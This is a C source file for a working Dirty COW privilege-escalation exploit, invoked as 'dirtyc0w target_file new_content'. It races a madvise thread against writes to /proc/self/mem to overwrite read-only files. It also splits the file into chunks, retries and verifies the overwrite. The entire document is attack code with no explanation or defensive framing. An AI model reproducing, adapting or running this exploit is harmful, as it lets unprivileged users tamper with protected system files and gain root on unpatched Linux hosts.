#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h> //getpagesize
#include <malloc.h> //malloc

typedef struct {
	void* map;
	char* buffer;
	unsigned int start;
	unsigned int size;
	char cont;
	int selfMem;
} CowData;


void* madviseThread(void* arg)
{
	CowData* cowData = (CowData*) arg;
	unsigned int pagesize = getpagesize();
	uintptr_t startPos = (uintptr_t)cowData->map + (uintptr_t) cowData->start;
	int c = 0;
	int extrasize = (startPos % pagesize);
	startPos = startPos - extrasize;
	
	while(cowData->cont)
		c += madvise((void*) startPos, extrasize + cowData->size, MADV_DONTNEED);
	return NULL;
}

void* procselfmemThread(void* arg)
{
	CowData* cowData = (CowData*) arg;
	uintptr_t startPos = ((uintptr_t) cowData->map )+ ((uintptr_t) cowData->start);
	
	int c = 0;
	while (cowData->cont) {
		lseek(cowData->selfMem,startPos, SEEK_SET);
		c += write(cowData->selfMem, cowData->buffer, cowData->size);
	}
	return NULL;
}

unsigned int copyErrors(CowData* cowData)
{
	int i = 0;
	unsigned int errors = 0;
	unsigned int A,B,C;
	char * var = (char*) malloc(cowData->size);
	uintptr_t startPos = ((uintptr_t) cowData->map )+ ((uintptr_t) cowData->start);
	
	lseek(cowData->selfMem,startPos,SEEK_SET);
	read(cowData->selfMem,var,cowData->size);
	char * mapMem = (char*) startPos;
	
	for(i = 0; i < cowData->size;i++)
	{
		A = (unsigned char)var[i];
		B = (unsigned char)cowData->buffer[i];
		C= (unsigned char) mapMem[i];
		if(A!= B || B != C)
			errors++;
	}
		
	return errors;
}

unsigned int runCowIteration(CowData* cowData, unsigned int millisecs)
{
	pthread_t pth1, pth2;
	unsigned int errors =0;
	cowData->cont = 1;
	pthread_create(&pth1, NULL, madviseThread, cowData);
	pthread_create(&pth2, NULL, procselfmemThread, cowData);
	usleep(millisecs*1000);
	cowData->cont = 0;
	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);
	errors = copyErrors(cowData);
	return errors;
}

unsigned int loadSourceFile(char* filename, CowData* cowData)
{
	cowData->size = 0;
	struct stat st;
	int f = open(filename, O_RDONLY);
	if (f < 0)
		return 0;
	fstat(f, &st);
	void* buf = malloc(st.st_size);
	int letti = read(f, buf, st.st_size);
	close(f);

	if (letti <= 0)
		return 0;

	cowData->buffer = buf;
	cowData->size = letti;
	return letti;
}

unsigned int loadSourceString(char * string, CowData* cowData)
{
	cowData->size = 0;
	unsigned int bufLen = strlen(string);
	if(bufLen > 0)
	{
		cowData->buffer = string;
		cowData->size = bufLen;
		
	}
	return cowData->size;
}

unsigned int loadDestinationFile(char * fileName,CowData* cowData)
{
	struct stat st;
	void* map;
	size_t union_length = cowData->size;
	
	int f = open(fileName, O_RDONLY);
	if(f < 0)
		return 0;
	fstat(f, &st);
	map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
	if(MAP_FAILED == map)
	{
		close(f);
		return 0;
	}
	if (union_length > st.st_size)
		union_length = st.st_size;
	cowData->size = union_length;
	cowData->map = map;
	return union_length;
}

int prepareCowData(CowData* cowData)
{
	cowData->size = 0;
	cowData->buffer = NULL;
	cowData->map = NULL;
	cowData->start = 0;
	cowData->selfMem = -1;
	int f = open ("/proc/self/mem", O_RDWR);
	if(f < 0)
		return f;
	cowData->selfMem = f;
	return f;
}

unsigned int runCow(CowData* cow)
{
	unsigned int milliseconds = 200;
	unsigned int chunk_size = 512*2*100;
	unsigned int maxIterations = 5;
	
	unsigned int start = cow->start;
	unsigned int remaining = cow->size;
	char * originalBuffer = cow->buffer;
	unsigned int originalStart = cow->start;
	unsigned int originalSize = cow->size;
	
	unsigned int errors;
	unsigned int current_chunk;
	int i;
	
	while(remaining > 0)
	{
			current_chunk = chunk_size;
			if(current_chunk > remaining)
				current_chunk = remaining;
			cow->start = start;
			cow->size = current_chunk;
			errors = 0;
			printf("cowing. Start: %u, size: %u\n",cow->start,cow->size);
			if(copyErrors(cow) != 0)
			{
				for(i = 0; i<maxIterations; i++)
				{
					errors = runCowIteration(cow,milliseconds);
					if(errors == 0)
						break;
				}
			}
			
			if(errors > 0)
				return 0;
			start += cow->size;
			remaining -= cow->size;
			cow->buffer += cow->size;
	}
	
	cow->buffer = originalBuffer ;
	cow->start = originalStart;
	cow->size = originalSize ;
	
	if(errors > 0)
		return 0;
	else
		return 1;
}

int main(int argc, char* argv[])
{

	if (argc < 3) {
		fprintf(stderr, "%s\n", "usage: dirtyc0w target_file new_content");
		return 1;
	}
	
	CowData cow;
	
	if(prepareCowData(&cow) < 0)
	{
		printf("prepare error\n");
		return 1;
	}
	
	if(loadSourceFile(argv[2],&cow) == 0  &&  loadSourceString(argv[2],&cow) == 0)
	{
		printf("load source error\n");
		return 1;
	}
	
	if(loadDestinationFile(argv[1],&cow) == 0)
	{
		printf("load destination error\n");
		return 1;
	}
	
	if(runCow(&cow) == 0)
	{
		printf("cow failed\n");
		return 1;
	}
	
	return 0;
}
